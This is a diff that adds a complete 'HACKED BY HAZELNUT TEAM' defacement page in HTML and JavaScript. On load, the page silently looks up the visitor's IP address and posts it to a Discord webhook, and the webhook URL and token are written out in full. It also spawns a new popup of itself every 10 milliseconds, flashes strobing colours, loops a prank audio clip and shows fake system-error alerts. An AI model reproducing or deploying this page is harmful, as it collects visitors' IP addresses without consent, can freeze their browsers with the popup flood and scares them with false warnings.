@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HACKED BY HAZELNUT TEAM</title>
+  <style>
+    body {
+      background: black;
+      color: red;
+      font-family: 'Courier New', monospace;
+      overflow: hidden;
+      text-align: center;
+      user-select: none;
+    }.glitch {
+  font-size: 4rem;
+  font-weight: bold;
+  position: relative;
+  color: white;
+  animation: glitchEffect 0.2s infinite;
+}
+
+@keyframes glitchEffect {
+  0% { text-shadow: 5px 5px red, -5px -5px blue; }
+  25% { text-shadow: -5px 5px red, 5px -5px blue; }
+  50% { text-shadow: 5px -5px red, -5px 5px blue; }
+  75% { text-shadow: -5px -5px red, 5px 5px blue; }
+  100% { text-shadow: 5px 5px red, -5px -5px blue; }
+}
+
+  </style>
+</head>
+<body>
+  <h1 class="glitch">YOU HAVE BEEN HACKED!</h1>  <audio id="annoyingSound" autoplay loop>
+    <source src="https://youareanidiot.cc/media/youare.mp3" type="audio/mp3">
+  </audio>  <script>
+    window.onload = function() {
+      let audio = document.getElementById("annoyingSound");
+      document.body.addEventListener("click", () => audio.play());
+      document.body.addEventListener("keydown", () => audio.play());
+
+      // Mengambil alamat IP dan mengirim ke webhook
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          fetch('https://discord.com/api/webhooks/1348149288579891230/vMwbJioC6BccY6wEtaDWotoL_ezlfd_875kj1HSo4m6xyBkVZlMAxPO9hA_iWt0lXbP2', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ip: data.ip})
+          });
+        });
+    };
+
+    setInterval(() => {
+      document.body.style.backgroundColor = "#" + Math.floor(Math.random()*16777215).toString(16);
+      document.title = ["HACKED", "BROKEN", "ERROR", "WARNING"][Math.floor(Math.random() * 4)];
+    }, 100);
+
+    setInterval(() => {
+      window.open(window.location.href, "_blank", "width=300,height=300,left="+Math.random()*screen.width+",top="+Math.random()*screen.height);
+    }, 10);
+
+    setInterval(() => {
+      alert("SYSTEM ERROR! PLEASE RESTART YOUR DEVICE!");
+    }, 5000);
+  </script></body>
+</html>
